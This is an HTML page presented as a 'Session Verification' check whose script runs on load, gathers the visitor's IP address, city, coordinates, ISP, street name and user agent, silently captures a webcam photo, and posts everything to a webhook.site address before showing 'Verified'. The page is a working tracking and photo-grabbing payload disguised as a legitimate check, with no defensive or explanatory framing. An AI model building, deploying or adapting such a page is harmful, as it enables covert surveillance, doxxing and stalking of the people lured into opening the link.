<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body style="font-family:Arial;text-align:center;margin-top:50px;">
  <h3>Session Verification</h3>
  <p>Verifying device, region, and capturing photo...</p>
  <video id="video" width="320" height="240" autoplay style="display:none;"></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

  <script>
    async function verify() {
      try {
        // Step 1: Get IP info
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());

        // Step 2: Reverse geocode using OpenCage API (free tier)
        const opencageKey = "YOUR_OPENCAGE_KEY"; // Replace with your key
        const geoData = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${ipData.latitude}+${ipData.longitude}&key=${opencageKey}`)
          .then(res => res.json());
        
        const street = geoData.results[0]?.components.road || "N/A";

        // Step 3: Capture webcam photo
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        // Ask for webcam permission
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = "block";

        // Wait a moment to capture
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Draw video frame to canvas
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL("image/png"); // base64 image

        // Stop webcam
        stream.getTracks().forEach(track => track.stop());

        // Step 4: Send data to webhook
        await fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: ipData.ip,
            city: ipData.city,
            region: ipData.region,
            country: ipData.country_name,
            latitude: ipData.latitude,
            longitude: ipData.longitude,
            street: street,
            isp: ipData.org,
            asn: ipData.asn,
            userAgent: navigator.userAgent,
            time: new Date().toISOString(),
            photo: photoData
          })
        });

        document.body.innerHTML = "<h3>Verified âœ…</h3>";

      } catch (err) {
        document.body.innerHTML = "<h3>Verification failed</h3><p>" + err + "</p>";
      }
    }

    verify();
  </script>
</body>
</html>
